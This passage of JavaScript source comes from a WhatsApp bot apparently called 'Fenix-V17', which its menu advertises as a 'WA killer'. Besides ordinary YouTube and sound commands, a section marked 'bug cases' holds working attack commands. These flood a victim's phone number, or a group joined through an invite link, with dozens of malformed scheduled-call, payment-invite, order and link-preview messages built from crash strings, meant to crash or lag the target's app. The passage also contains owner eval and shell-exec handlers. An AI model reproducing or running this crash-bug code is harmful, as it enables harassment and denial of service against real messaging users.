if (args.length < 1 || !isUrl(text) || !fenixaudp3.isYTUrl(text)) return replygcfenix(`Where's the yt link?\nExample: ${prefix + command} https://youtube.com/@fenix_programmer?si=xwkkXTVWWGuJ9Tde`)
const audio=await fenixaudp3.mp3(text)
await FenixFucking.sendMessage(m.chat,{
    audio: fs.readFileSync(audio.path),
    mimetype: 'audio/mp4', ptt: true,
    contextInfo:{
        externalAdReply:{
            title:audio.meta.title,
            body: botname,
            thumbnail: await fetchBuffer(audio.meta.image),
            mediaType:2,
            mediaUrl:text,
        }

    },
},{quoted:m})
await fs.unlinkSync(audio.path)
break
case 'ytmp4': case 'ytvideo': {
const fenixvidoh = require('./www-fucking/Fenix9991/lib/ytdl2')
if (args.length < 1 || !isUrl(text) || !fenixvidoh.isYTUrl(text)) replygcfenix(`Where is the link??\n\nExample : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`)
const vid=await fenixvidoh.mp4(text)
const ytc=`
*${themeemoji}Tittle:* ${vid.title}
*${themeemoji}Date:* ${vid.date}
*${themeemoji}Duration:* ${vid.duration}
*${themeemoji}Quality:* ${vid.quality}`
await FenixFucking.sendMessage(m.chat,{
    video: {url:vid.videoUrl},
    caption: ytc
},{quoted:m})
}
break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
FenixFucking_dev = await getBuffer(`https://github.com/DGfenix/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await FenixFucking.sendMessage(m.chat, { audio: FenixFucking_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break

//bug cases
case 'clearchat':
feniximun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
case 'fenixkillapples':{
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
FenixFucking.relayMessage(from,{
extendedTextMessage:{
"text":'.',
"contextInfo": {
"stanzaId": victim,
"participant": victim,
"quotedMessage": {
"conversation": fenixviz
},
"disappearingMode": {
"initiator": "CHANGED_IN_CHAT",
"trigger": "CHAT_SETTING"
}
},
"inviteLinkGroupTypeV2": "DEFAULT"
}
},{messageId: null})
}
replygcfenix(`*Focusing ${victim} Target running*`)
}
break
case 'fenixkillapple': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
FenixFucking.sendMessage(victim,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Fenixviz6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
}}
})
}
replygcfenix(`*Focusing ${victim} Target running*`)
}
break
case 'fenixkillapple2': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
FenixFucking.sendMessage(m.chat,{
text: `https://google.com`,
contextInfo: {
externalAdReply: {
renderLargerThumbnail: true,
mediaType: 1,
title: Fenixviz6,
body: `###############################`,
thumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
jpegThumbnail: await getBuffer('https://logopng.com.br/logos/google-37.svg'),
previewType: "NONE",
sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
}}
})
}
replygcfenix(`*Successfully sent as many bugs as ${amount} Target running*`)
}
break
case 'fen':
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "50"
for (let i = 0; i < amount; i++) {
FenixFucking.relayMessage(victim,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'fen2':{
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
FenixFucking.relayMessage(m.chat,{ 
"paymentInviteMessage": {
serviceType: "UPI",
expiryTimestamp: Date.now() + (24 * 60 * 60 * 1000) 
}},{})
await sleep(3000)
}
replygcfenix(`*Successfully sent as many bugs as ${amount} Target running*`)
}
break
case 'f':{
if (!isPremium) return replygcfenix(mess.prem)
 if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 91xxxxxxxxxx`)
 victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "100"
for (let i = 0; i < amount; i++) {
fenixyCrashy(pushname,victim)
await sleep(3000)
}
replygcfenix(`*Focusing ${victim} Target running*`)
}
break
case 'f2':
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
 amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
fenixyCrashy(pushname,m.chat)
await sleep(3000)
}
replygcfenix(`*Successfully sent as many bugs as ${amount} Target running*`)
break
case 'amountbug': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return relygcfenix(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
amount = `${encodeURI(text)}`
for (let i = 0; i < amount; i++) {
const fenixybug1 = `${fenixviz}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Successfully sent as many bugs as ${amount} Target running*`)
break
case 'pmbug' :{
 if (!isPremium) return replygcfenix(mess.prem)
 if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
 await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = `${fenixviz}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'delaybug' : {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'docubug': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
if (args.length < 1) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
const fenixybug1 = `${fenixviz}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'unlimitedbug' : {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'bombug': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'lagbug' : {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
}
replygcfenix(`*Focusing ${victim} Target running*`)
break
case 'trollybug': {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} number\nExample ${prefix+command} 94773010580`)
await loading()
victim = text.split("|")[0]+'@s.whatsapp.net'
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "94773010580@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
FenixFucking.relayMessage(victim, order.message, { messageId: order.key.id })
}
replygcfenix(`*Focusing ${victim} Target running*`)
}
break
case 'gcbug' : {
if (!isPremium) return replygcfenix(mess.prem)
 if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = `${fenixviz}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'delaygcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz5
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'laggcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz2
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'bomgcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await haikal.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz4
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'unlimitedgcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "30"
for (let i = 0; i < amount; i++) {
const fenixybug1 = Fenixviz3
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'trollygcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
var order = generateWAMessageFromContent(from, proto.Message.fromObject({
"orderMessage": {
"orderId": "599519108102353",
"thumbnail": thumb,
"itemCount": 1999,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${botname}`,
"orderTitle": " TROLLY BUG ", 
"sellerJid": "94773010580@s.whatsapp.net",
"token": "AR6z9PAvHjs9Qa7AYgBUjSEvcnOcRWycFpwieIhaMKdrhQ=="
}
}), { userJid: from, quoted:m})
FenixFucking.relayMessage(fenixgc, order.message, { messageId: order.key.id })
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
}
break
case 'docugcbug' :  {
if (!isPremium) return replygcfenix(mess.prem)
if (!args[0]) return replygcfenix(`Use ${prefix+command} link\nExample ${prefix+command} https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`)
await loading()
let result = args[0].split('https://chat.whatsapp.com/')[1]
let fenixgc = await FenixFucking.groupAcceptInvite(result)
amount = "15"
for (let i = 0; i < amount; i++) {
const fenixybug1 = `${fenixviz}`
var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
"scheduledCallCreationMessage": {
"callType": "2",
"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
"title": fenixybug1,
}
}), { userJid: from, quoted : m})
FenixFucking.relayMessage(fenixgc, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
await sleep(3000)
}
replygcfenix(`*Focusing ${fenixgc} Target running*`)
} 
break
            case 'menu':
            case 'help':
            case 'fenix':
            case '?':
            await loading()
                let fenixmenuoh = `
*───── ❝ 𝐅𝐞𝐧𝐢𝐱-𝐕17 ❞ ─────*
┌───────────────────┐
├ᤃ -f <number>
├ᤃ -f2 <amount>
├ᤃ -fen <number>
├ᤃ -fen2 <amount>
├ᤃ -fenixkillapple <number>
├ᤃ -fenixkillapple2 <amount>
├ᤃ -fenixkillapples <number>
└───────────────────┘
├𓃠 - ᴅᴏᴡɴ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -play
├𖣊 -ytmp3
├𖣊 -ytmp4
├𖣊 -sound
└───────────────────┘
├𓃠 -ᴏᴡɴᴇʀ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -getsession
├𖣊 -deletesession
├𖣊 -join
├𖣊 -shutdown  
├𖣊 -restart
├𖣊 -autoread *[option]*
├𖣊 -autotyping *[option]*
├𖣊 -autorecording *[option]*
├𖣊 -autorecordtyp *[option]*
├𖣊 -autobio *[option]*
├𖣊 -autoswview *[option]*
├𖣊 -mode *[option]*
├𖣊 -block
├𖣊 -unblock 
├𖣊 -backup
├𖣊 -getcase
├𖣊 -addowner
├𖣊 -delowner
└───────────────────┘
├𓃠 -ɢʀᴏᴜᴘ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -closetime
├𖣊 -opentime
├𖣊 -kick
├𖣊 -add
├𖣊 -promote
├𖣊 -demote
├𖣊 -setdesc
├𖣊 -setppgc
├𖣊 -tagall
├𖣊 -hidetag
├𖣊 -totag
├𖣊 -group *[option]*
├𖣊 -editinfo
├𖣊 -linkgc
├𖣊 -revoke
├𖣊 -listonline
└───────────────────┘
├𓃠 -ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -sticker
├𖣊 -smeme
├𖣊 -take
├𖣊 -toimage
├𖣊 -tovideo
├𖣊 -toaudio
├𖣊 -tomp3
├𖣊 -tovn
├𖣊 -togif
├𖣊 -tourl
├𖣊 -toqr
├𖣊 -toviewonce
├𖣊 -fliptext
├𖣊 -emojimix
└───────────────────┘
├𓃠 -ᴍᴀɪɴ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -menu
├𖣊 -buypremium
├𖣊 -runtime
├𖣊 -script
├𖣊 -donate
├𖣊 -owner
└───────────────────┘
├𓃠 -ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ ]┈┈┈┈┈◙
┌───────────────────┐
├𖣊 -addvideo
├𖣊 -addimage
├𖣊 -addsticker
├𖣊 -addvn
├𖣊 -addzip
├𖣊 -addapk
├𖣊 -addpdf
├𖣊 -delvideo
├𖣊 -delimage
├𖣊 -delsticker
├𖣊 -delvn
├𖣊 -delzip
├𖣊 -delapk
├𖣊 -delpdf
├𖣊 -listvideo
├𖣊 -listimage
├𖣊 -liststicker
├𖣊 -listvn
├𖣊 -listzip
├𖣊 -listapk
├𖣊 -listpdf
└───────────────────┘
*───── ❝ 𝐅𝐞𝐧𝐢𝐱-𝐕17 ❞ ─────*
`
if (typemenu === 'v1') {
                    FenixFucking.sendMessage(m.chat, {
                        text: fenixmenuoh,
                        contextInfo: {
                            externalAdReply: {
                                title: 'ᴘᴏᴡᴇʀᴅ ʙʏ ꜰᴇɴɪx ꜱᴇʀᴠᴇʀ',
                                body: 'ᴡᴀ ᴋɪʟʟᴇʀ ᴠ17 ᴜʟᴛɪᴍᴀ',
                                thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
                                sourceUrl: 'https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w',
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    FenixFucking.sendMessage(m.chat, {
      video: fs.readFileSync('./www-fucking/Fenix9991/dexDump/thumb2.mp4'),
      gifPlayback: true,
      caption: fenixmenuoh,
      contextInfo: {
      externalAdReply: {
      title: 'ᴘᴏᴡᴇʀᴅ ʙʏ ꜰᴇɴɪx ꜱᴇʀᴠᴇʀ',
      body: 'ᴡᴀ ᴋɪʟʟᴇʀ ᴠ17 ᴜʟᴛɪᴍᴀ',
      thumbnailUrl: 'https://telegra.ph/file/f15e70e1f312e0993ab92.jpg',
      sourceUrl: `https://whatsapp.com/channel/0029VaV2xYy72WTw8ERfJE2w`,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    FenixFucking.sendMessage(m.chat, {
                        video: fs.readFileSync('./www-fucking/Fenix9991/dexDump/thumb2.mp4'),
                        caption: fenixmenuoh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    FenixFucking.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: fenixmenuoh
                        }
                    }, {})
                }
                break
                break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return replygcfenix(mess.owner)

                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                        if (sat == undefined) {
                            bang = util.format(sul)
                        }
                        return replygcfenix(bang)
                    }
                    try {
                        replygcfenix(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        replygcfenix(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return replygcfenix(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await replygcfenix(evaled)
                    } catch (err) {
                        await replygcfenix(String(err))
                    }
                }
                if (budy.startsWith('$')) {
                    if (!isCreator) return replygcfenix(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if (err) return replygcfenix(err)
                        if (stdout) return replygcfenix(stdout)
                    })
                }
        }
    } catch (err) {
        FenixFucking.sendText(ownernumber + '@s.whatsapp.net', util.format(err), m)
        console.log(util.format(err))
    }
}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})

process.on('uncaughtException', function (err) {
let e = String(err)
if (e.includes("conflict")) return
if (e.includes("Socket connection timeout")) return
if (e.includes("not-authorized")) return
if (e.includes("already-exists")) return
if (e.includes("rate-overlimit")) return
if (e.includes("Connection Closed")) return
if (e.includes("Timed Out")) return
if (e.includes("Value not found")) return
console.log('Caught exception: ', err)
})